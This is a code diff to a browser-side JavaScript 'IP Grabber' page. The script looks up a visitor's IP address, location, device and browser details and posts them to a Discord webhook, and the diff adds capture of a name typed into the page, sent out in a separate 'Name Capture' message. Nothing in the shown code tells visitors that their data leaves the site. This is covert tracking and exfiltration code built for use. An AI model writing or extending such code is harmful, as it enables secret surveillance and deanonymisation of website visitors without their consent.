@@ -7,6 +7,13 @@ let currentUserInfo = null;
 // Simple test function to open modal (for debugging)
 function testModal() {
     console.log('Test modal function called');
+    
+    // Capture the name from input field
+    const nameInput = document.getElementById('nameInput');
+    const enteredName = nameInput ? nameInput.value.trim() : '';
+    
+    console.log('Entered name:', enteredName);
+    
     const modal = document.getElementById('detailsModal');
     const loading = document.getElementById('loading');
     const userDetails = document.getElementById('userDetails');
@@ -20,12 +27,14 @@ function testModal() {
         // If we have user info, show it after a delay
         if (currentUserInfo) {
             console.log('Using cached user info');
+            // Update the cached info with the new name
+            currentUserInfo.enteredName = enteredName;
             setTimeout(() => {
                 displayUserInfo();
             }, 1500);
         } else {
             console.log('Grabbing user info...');
-            grabUserInfo().then(() => {
+            grabUserInfo(enteredName).then(() => {
                 setTimeout(() => {
                     displayUserInfo();
                 }, 2000);
@@ -37,7 +46,7 @@ function testModal() {
 }
 
 // Function to get user's IP and device information
-async function grabUserInfo() {
+async function grabUserInfo(enteredName = '') {
     try {
         // Get IP information from multiple sources for reliability
         const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -86,7 +95,8 @@ async function grabUserInfo() {
             screenColorDepth: screenColorDepth,
             timezone: timezone,
             timestamp: timestamp,
-            referrer: document.referrer || 'Direct visit'
+            referrer: document.referrer || 'Direct visit',
+            enteredName: enteredName || 'Not provided'
         };
         
         // Store user info globally for modal display
@@ -94,6 +104,11 @@ async function grabUserInfo() {
         
         // Send to Discord webhook
         await sendToDiscord(userInfo);
+        
+        // Send name separately if provided
+        if (enteredName && enteredName.trim() !== '') {
+            await sendNameToDiscord(enteredName, userInfo.ip);
+        }
         
         return userInfo;
     } catch (error) {
@@ -112,27 +127,32 @@ async function sendToDiscord(userInfo) {
     }
     
     const embed = {
-        title: "New Visitor Detected",
+        title: userInfo.enteredName !== 'Not provided' ? `🎯 New Visitor: ${userInfo.enteredName}` : "🎯 New Visitor Detected",
         color: 0xFF0000, // Red color
         timestamp: userInfo.timestamp,
         fields: [
             {
-                name: "Network Information",
+                name: "👤 Visitor Information",
+                value: `**Name:** ${userInfo.enteredName}\n**Visit Time:** ${new Date(userInfo.timestamp).toLocaleString()}`,
+                inline: false
+            },
+            {
+                name: "🌐 Network Information",
                 value: `**IP Address:** ${userInfo.ip}\n**ISP:** ${userInfo.isp}`,
                 inline: false
             },
             {
-                name: "Location",
+                name: "📍 Location",
                 value: `**Country:** ${userInfo.country} (${userInfo.countryCode})\n**Region:** ${userInfo.region}\n**City:** ${userInfo.city}\n**Postal:** ${userInfo.postal}\n**Coordinates:** ${userInfo.latitude}, ${userInfo.longitude}`,
                 inline: false
             },
             {
-                name: "Device Information",
+                name: "💻 Device Information",
                 value: `**Platform:** ${userInfo.platform}\n**Screen:** ${userInfo.screenWidth}x${userInfo.screenHeight} (${userInfo.screenColorDepth}-bit)\n**Language:** ${userInfo.language}\n**Timezone:** ${userInfo.timezone}`,
                 inline: false
             },
             {
-                name: "Browser Information",
+                name: "🌐 Browser Information",
                 value: `**User Agent:** ${userInfo.userAgent}\n**Cookies:** ${userInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n**Java:** ${userInfo.javaEnabled ? 'Enabled' : 'Disabled'}\n**Referrer:** ${userInfo.referrer}`,
                 inline: false
             }
@@ -195,6 +215,53 @@ async function sendErrorToDiscord(error) {
         });
     } catch (webhookError) {
         console.error('Error sending error to Discord:', webhookError);
+    }
+}
+
+// Function to send name separately to Discord
+async function sendNameToDiscord(name, ip) {
+    if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
+        console.log('Name that would be sent separately:', name);
+        return;
+    }
+    
+    const embed = {
+        title: "📝 Name Entered",
+        color: 0x00FF00, // Green color
+        description: `**${name}** just entered their name on the site`,
+        fields: [
+            {
+                name: "Details",
+                value: `**Name:** ${name}\n**IP:** ${ip}\n**Time:** ${new Date().toLocaleString()}`,
+                inline: false
+            }
+        ],
+        footer: {
+            text: "Name Capture • IP Grabber"
+        },
+        timestamp: new Date().toISOString()
+    };
+    
+    const payload = {
+        embeds: [embed]
+    };
+    
+    try {
+        const response = await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Discord name webhook failed: ${response.status}`);
+        }
+        
+        console.log('Successfully sent name to Discord');
+    } catch (error) {
+        console.error('Error sending name to Discord:', error);
     }
 }
 
@@ -286,6 +353,18 @@ function displayUserInfo() {
     } else {
         userDetails.innerHTML = `
             <div class="detail-group">
+                <h3>👤 Your Information</h3>
+                <div class="detail-item">
+                    <span class="detail-label">Name:</span>
+                    <span class="detail-value">${currentUserInfo.enteredName}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Visit Time:</span>
+                    <span class="detail-value">${new Date(currentUserInfo.timestamp).toLocaleString()}</span>
+                </div>
+            </div>
+            
+            <div class="detail-group">
                 <h3>🌐 Network Information</h3>
                 <div class="detail-item">
                     <span class="detail-label">IP Address:</span>
@@ -362,10 +441,6 @@ function displayUserInfo() {
                 <div class="detail-item">
                     <span class="detail-label">Referrer:</span>
                     <span class="detail-value">${currentUserInfo.referrer}</span>
-                </div>
-                <div class="detail-item">
-                    <span class="detail-label">Visit Time:</span>
-                    <span class="detail-value">${new Date(currentUserInfo.timestamp).toLocaleString()}</span>
                 </div>
             </div>
         `;
